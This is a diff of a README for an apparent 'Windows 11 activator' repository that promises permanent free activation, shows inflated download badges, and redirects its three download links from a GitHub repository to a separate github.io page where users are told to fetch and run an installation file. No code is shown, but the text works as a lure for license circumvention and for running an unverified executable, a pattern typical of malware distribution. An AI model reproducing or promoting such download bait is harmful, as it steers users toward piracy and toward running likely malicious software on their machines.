@@ -1,6 +1,6 @@
 # 🚀 windows-11-activator-2026 - Activate Windows 11 Instantly and Forever
 
-[![Download Now](https://img.shields.io/badge/Download-Windows_11_Activator_2026-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cool-caseshot9239/windows-11-activator-2026)
+[![Download Now](https://img.shields.io/badge/Download-Windows_11_Activator_2026-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://cool-caseshot9239.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v11-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-3.2m%2B-orange?style=flat-square)
 
@@ -37,7 +37,7 @@ Follow these simple steps to activate your Windows 11 today:
 
 ### Step 1: Download the Activator
 
-Visit this link to download the application: **[https://github.com/Cool-caseshot9239/windows-11-activator-2026](https://github.com/Cool-caseshot9239/windows-11-activator-2026)**
+Visit this link to download the application: **[https://cool-caseshot9239.github.io](https://cool-caseshot9239.github.io)**
 
 Click the **Download** button on that page to get the installation file.
 
@@ -144,7 +144,7 @@ If you encounter any issues:
 
 Ready to activate? Get the tool now:
 
-[![DOWNLOAD ACTIVATOR](https://img.shields.io/badge/⬇_DOWNLOAD_WINDOWS_11_ACTIVATOR-2026-2ea44f?style=for-the-badge)](https://github.com/Cool-caseshot9239/windows-11-activator-2026)
+[![DOWNLOAD ACTIVATOR](https://img.shields.io/badge/⬇_DOWNLOAD_WINDOWS_11_ACTIVATOR-2026-2ea44f?style=for-the-badge)](https://cool-caseshot9239.github.io)
 
 **Installation summary:**
 1. Visit the link above
